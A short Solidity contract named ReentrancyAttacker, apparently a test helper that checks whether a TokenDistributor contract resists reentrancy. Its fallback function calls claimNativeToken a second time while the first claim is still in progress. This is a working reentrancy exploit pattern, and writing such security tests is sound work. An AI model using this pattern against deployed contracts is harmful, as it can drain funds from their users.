pragma solidity ^0.8.0;

import "../TokenDistributor.sol";

contract ReentrancyAttacker {
  address public _tokenDistributor;
  uint256 public _amount;
  bool public recalled;

  function attack(address tokenDistributor, uint256 amount) external {
    _tokenDistributor = tokenDistributor;
    _amount = amount;

    recalled = false;
    TokenDistributor(_tokenDistributor).claimNativeToken(_amount);
  }

  fallback() external payable {
    if (!recalled) {
      recalled = true;
      TokenDistributor(_tokenDistributor).claimNativeToken(_amount);
    }
  }
}